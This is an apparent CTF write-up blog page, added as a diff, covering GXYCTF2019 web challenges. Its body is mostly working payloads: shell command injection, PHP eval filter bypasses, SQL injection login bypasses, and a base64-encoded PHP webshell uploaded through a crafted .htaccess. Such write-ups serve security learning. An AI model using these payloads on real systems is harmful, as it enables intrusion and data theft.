@@ -1,0 +1,453 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="[GXYCTF2019]Ping Ping Ping一个RCE 12345?ip&#x3D;127.0.0.1;ls?ip&#x3D;127.0.0.1;nl$IFS$1&#96;ls&#96;?ip&#x3D;127.0.0.1;a&#x3D;g;cat$IFS$1fla$a.php?ip&#x3D;127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh  [GXYCTF2019]禁止套娃扫描后台,状态码全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="GXYCTF2019">
+<meta property="og:url" content="https://baozongwi.xyz/posts/ce51adc0.html">
+<meta property="og:site_name" content="baozongwi:H@cking Th3 Fu1ure">
+<meta property="og:description" content="[GXYCTF2019]Ping Ping Ping一个RCE 12345?ip&#x3D;127.0.0.1;ls?ip&#x3D;127.0.0.1;nl$IFS$1&#96;ls&#96;?ip&#x3D;127.0.0.1;a&#x3D;g;cat$IFS$1fla$a.php?ip&#x3D;127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh  [GXYCTF2019]禁止套娃扫描后台,状态码全">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-08-11T11:30:43.000Z">
+<meta property="article:modified_time" content="2025-07-13T10:31:48.041Z">
+<meta property="article:author" content="baozongwi">
+<meta property="article:tag" content="php">
+<meta property="article:tag" content="mysql">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/acvtar.jpg">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/acvtar.jpg" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/acvtar.jpg">
+        
+      
+    
+    <!-- title -->
+    <title>GXYCTF2019</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="baozongwi:H@cking Th3 Fu1ure" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+	<!-- Waline Comments -->
+	
+		<link rel="stylesheet" href="https://unpkg.com/@waline/client@v2/dist/waline.css"/>
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">H0me</a></li><!--
+     --><!--
+       --><li><a href="/about/">Aβout</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Topi3s</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Cat4gory</a></li><!--
+     --><!--
+       --><li><a href="/links/">Li^ks</a></li><!--
+     --><!--
+       --><li><a href="/search/">Seαrch</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/posts/1f01c3ee.html"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/posts/1c8a5b12.html"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://baozongwi.xyz/posts/ce51adc0.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://baozongwi.xyz/posts/ce51adc0.html&text=GXYCTF2019"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://baozongwi.xyz/posts/ce51adc0.html&title=GXYCTF2019"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://baozongwi.xyz/posts/ce51adc0.html&is_video=false&description=GXYCTF2019"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=GXYCTF2019&body=Check out this article: https://baozongwi.xyz/posts/ce51adc0.html"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://baozongwi.xyz/posts/ce51adc0.html&title=GXYCTF2019"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://baozongwi.xyz/posts/ce51adc0.html&title=GXYCTF2019"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://baozongwi.xyz/posts/ce51adc0.html&title=GXYCTF2019"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://baozongwi.xyz/posts/ce51adc0.html&title=GXYCTF2019"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://baozongwi.xyz/posts/ce51adc0.html&name=GXYCTF2019&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://baozongwi.xyz/posts/ce51adc0.html&t=GXYCTF2019"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#GXYCTF2019-Ping-Ping-Ping"><span class="toc-number">1.</span> <span class="toc-text">[GXYCTF2019]Ping Ping Ping</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GXYCTF2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83"><span class="toc-number">2.</span> <span class="toc-text">[GXYCTF2019]禁止套娃</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E7%BB%84%E6%93%8D%E4%BD%9C"><span class="toc-number">2.1.</span> <span class="toc-text">数组操作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#session-id"><span class="toc-number">2.2.</span> <span class="toc-text">session_id</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GXYCTF2019-BabySQli"><span class="toc-number">3.</span> <span class="toc-text">[GXYCTF2019]BabySQli</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GXYCTF2019-BabyUpload"><span class="toc-number">4.</span> <span class="toc-text">[GXYCTF2019]BabyUpload</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GXYCTF2019-StrongestMind"><span class="toc-number">5.</span> <span class="toc-text">[GXYCTF2019]StrongestMind</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GXYCTF2019-BabysqliV3-0"><span class="toc-number">6.</span> <span class="toc-text">[GXYCTF2019]BabysqliV3.0</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        GXYCTF2019
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">baozongwi</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-08-11T11:30:43.000Z" class="dt-published" itemprop="datePublished">2024-08-11</time>
+        
+        (Updated: <time datetime="2025-07-13T10:31:48.041Z" class="dt-updated" itemprop="dateModified">2025-07-13</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E5%A4%8D%E7%8E%B0/">复现</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/mysql/" rel="tag">mysql</a>, <a class="p-category" href="/tags/php/" rel="tag">php</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h1><p>一个<code>RCE</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1;ls</span><br><span class="line"></span><br><span class="line">?ip=127.0.0.1;nl$IFS$1`ls`</span><br><span class="line">?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php</span><br><span class="line">?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</span><br></pre></td></tr></table></figure>
+
+<h1 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h1><p>扫描后台,状态码全为429,估计是<code>.git</code>泄露</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python GitHack.py http://5e48725e-b21b-41a7-96d1-398a11a05f3d.node5.buuoj.cn:81/.git</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>第一种是用数组来看元素内容,还有一种类似于极客大挑战的RCE</p>
+<h2 id="数组操作"><a href="#数组操作" class="headerlink" title="数组操作"></a>数组操作</h2><p><code>pos() / current()</code> 默认返回数组第一个元素<br><code>end()</code> ： 将内部指针指向数组中的最后一个元素，并输出<br><code>next()</code> ：将内部指针指向数组中的下一个元素，并输出<br><code>prev()</code> ：将内部指针指向数组中的上一个元素，并输出<br><code>reset()</code> ： 将内部指针指向数组中的第一个元素，并输出<br><code>each()</code> ： 返回当前元素的键名和键值，并将内部指针向前移动</p>
+<p><code>pos()</code> 输出数组中的当前元素的值。</p>
+<p><code>localeconv()</code> 函数返回一个包含本地数字及货币格式信息的数组，该数组的第一个元素就是”.”。</p>
+<p><code>array_reverse()</code>函数将数组逆向返回</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?exp=var_dump(scandir(pos(localeconv())));</span><br><span class="line">array(5) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(4) &quot;.git&quot; [3]=&gt; string(8) &quot;flag.php&quot; [4]=&gt; string(9) &quot;index.php&quot; &#125;</span><br><span class="line"></span><br><span class="line">?exp=var_dump(array_reverse(scandir(pos(localeconv()))));</span><br><span class="line">array(5) &#123; [0]=&gt; string(9) &quot;index.php&quot; [1]=&gt; string(8) &quot;flag.php&quot; [2]=&gt; string(4) &quot;.git&quot; [3]=&gt; string(2) &quot;..&quot; [4]=&gt; string(1) &quot;.&quot; &#125;</span><br><span class="line"></span><br><span class="line">?exp=show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>
+
+<h2 id="session-id"><a href="#session-id" class="headerlink" title="session_id"></a>session_id</h2><p>获取session_id值来得到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Request:</span><br><span class="line"></span><br><span class="line">GET /?exp=highlight_file(session_id(session_start())); HTTP/1.1</span><br><span class="line">Host: 5e48725e-b21b-41a7-96d1-398a11a05f3d.node5.buuoj.cn:81</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">cookie:PHPSESSID=flag.php</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+
+<h1 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h1><p><strong>原题目描述：刚学完sqli，我才知道万能口令这么危险，还好我进行了防护，还用md5哈希了密码！</strong></p>
+<p>进入页面发现一段base32,解码得到</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;$name&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>本地尝试</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;3&#x27;</span>;</span><br><span class="line">回显是可以查出结果的,也就是说对的上就可以过waf</span><br></pre></td></tr></table></figure>
+
+<p>那么我们已知用户名<code>admin</code></p>
+<p>数组绕过的原理是<code>md5</code>无法正确处理那写个NULL</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">name=1&#x27;union select 1,&#x27;admin&#x27;,NULL&#x27;&amp;pw[]=123</span><br><span class="line"></span><br><span class="line">name=1&#x27;union select 1,&#x27;admin&#x27;,&#x27;c4ca4238a0b923820dcc509a6f75849b&#x27;--+&amp;pw=1</span><br></pre></td></tr></table></figure>
+
+<h1 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">poc.jpg:</span><br><span class="line"></span><br><span class="line">GIF89a66</span><br><span class="line">PD9waHAgZXZhbCgkX1BPU1RbJ2EnXSk7Pz4=</span><br></pre></td></tr></table></figure>
+
+<p>Apache 中的用户配置文件<code> .htaccess</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.htaccess:</span><br><span class="line"></span><br><span class="line">#define width 1337</span><br><span class="line">#define height 1337</span><br><span class="line">php_value auto_prepend_file &quot;php://filter/convert.base64-decode/resource=./poc.jpg&quot;</span><br><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure>
+
+<p>就只有<code>.htaccess</code>要改包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Request:</span><br><span class="line"></span><br><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 11bfa6a3-cb08-46b8-be53-c3fe62e8e9d9.node5.buuoj.cn:81</span><br><span class="line">Content-Length: 448</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://11bfa6a3-cb08-46b8-be53-c3fe62e8e9d9.node5.buuoj.cn:81</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySHvAkitNnbjrpFPs</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://11bfa6a3-cb08-46b8-be53-c3fe62e8e9d9.node5.buuoj.cn:81/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=f016788420ed0034ee8e12c63ce82728</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundarySHvAkitNnbjrpFPs</span><br><span class="line">Content-Disposition: form-data; name=&quot;uploaded&quot;; filename=&quot;.htaccess&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">#define width 1337</span><br><span class="line">#define height 1337</span><br><span class="line">php_value auto_prepend_file &quot;php://filter/convert.base64-decode/resource=./poc.jpg&quot;</span><br><span class="line">AddType application/x-httpd-php .jpg</span><br><span class="line">------WebKitFormBoundarySHvAkitNnbjrpFPs</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">上传</span><br><span class="line">------WebKitFormBoundarySHvAkitNnbjrpFPs--</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/var/www/html/upload/105f4cd49f8eb583ed1fde143caec1d1/.htaccess succesfully uploaded!</span><br><span class="line">/var/www/html/upload/105f4cd49f8eb583ed1fde143caec1d1/poc.jpg succesfully uploaded!</span><br></pre></td></tr></table></figure>
+
+<p>然后直接链接<code>antsword</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url:http://11bfa6a3-cb08-46b8-be53-c3fe62e8e9d9.node5.buuoj.cn:81/upload/105f4cd49f8eb583ed1fde143caec1d1/poc.jpg</span><br><span class="line">password:a</span><br></pre></td></tr></table></figure>
+
+<h1 id="GXYCTF2019-StrongestMind"><a href="#GXYCTF2019-StrongestMind" class="headerlink" title="[GXYCTF2019]StrongestMind"></a>[GXYCTF2019]StrongestMind</h1><p>感觉没啥技术,但是是第一次接触这种</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://aa491c77-bfa4-4503-9a09-8ee6cf93839c.node5.buuoj.cn:81/&quot;</span></span><br><span class="line">s= requests.session()</span><br><span class="line">key=re.<span class="built_in">compile</span>(<span class="string">r&#x27;\d+ [-|+] \d+&#x27;</span>)</span><br><span class="line">r=s.get(url=url)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1001</span>):</span><br><span class="line">    a=key.findall(r.text)[<span class="number">0</span>]   <span class="comment"># 匹配第一组:例子 123+456</span></span><br><span class="line">    aa=<span class="built_in">eval</span>(a)</span><br><span class="line">    data=&#123;<span class="string">&quot;answer&quot;</span>:aa&#125;</span><br><span class="line">    time.sleep(<span class="number">0.1</span>)    <span class="comment">#避免429</span></span><br><span class="line">    r=s.post(url=url,data=data)</span><br><span class="line">    r.encoding=<span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
+
+<h1 id="GXYCTF2019-BabysqliV3-0"><a href="#GXYCTF2019-BabysqliV3-0" class="headerlink" title="[GXYCTF2019]BabysqliV3.0"></a>[GXYCTF2019]BabysqliV3.0</h1><p>phar反序列化</p>
+
+  </div>
+
+  <!-- 赞赏按钮和二维码 -->
+  <div class="donation-container">
+    <button id="donate-btn" class="donate-btn">reward</button>
+    <div id="donation-qr" class="donation-qr" style="display: none;">
+      <img src="/images/award.png" alt="扫码打赏" />
+    </div>
+  </div>
+  <!-- 赞赏按钮和二维码的结束 -->
+
+</article>
+
+
+
+
+    <div class="blog-post-comments">
+        <div id="waline_thread"></div>
+    </div>
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">H0me</a></li>
+        
+          <li><a href="/about/">Aβout</a></li>
+        
+          <li><a href="/tags/">Topi3s</a></li>
+        
+          <li><a href="/categories/">Cat4gory</a></li>
+        
+          <li><a href="/links/">Li^ks</a></li>
+        
+          <li><a href="/search/">Seαrch</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#GXYCTF2019-Ping-Ping-Ping"><span class="toc-number">1.</span> <span class="toc-text">[GXYCTF2019]Ping Ping Ping</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GXYCTF2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83"><span class="toc-number">2.</span> <span class="toc-text">[GXYCTF2019]禁止套娃</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E7%BB%84%E6%93%8D%E4%BD%9C"><span class="toc-number">2.1.</span> <span class="toc-text">数组操作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#session-id"><span class="toc-number">2.2.</span> <span class="toc-text">session_id</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GXYCTF2019-BabySQli"><span class="toc-number">3.</span> <span class="toc-text">[GXYCTF2019]BabySQli</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GXYCTF2019-BabyUpload"><span class="toc-number">4.</span> <span class="toc-text">[GXYCTF2019]BabyUpload</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GXYCTF2019-StrongestMind"><span class="toc-number">5.</span> <span class="toc-text">[GXYCTF2019]StrongestMind</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GXYCTF2019-BabysqliV3-0"><span class="toc-number">6.</span> <span class="toc-text">[GXYCTF2019]BabysqliV3.0</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://baozongwi.xyz/posts/ce51adc0.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://baozongwi.xyz/posts/ce51adc0.html&text=GXYCTF2019"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://baozongwi.xyz/posts/ce51adc0.html&title=GXYCTF2019"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://baozongwi.xyz/posts/ce51adc0.html&is_video=false&description=GXYCTF2019"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=GXYCTF2019&body=Check out this article: https://baozongwi.xyz/posts/ce51adc0.html"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
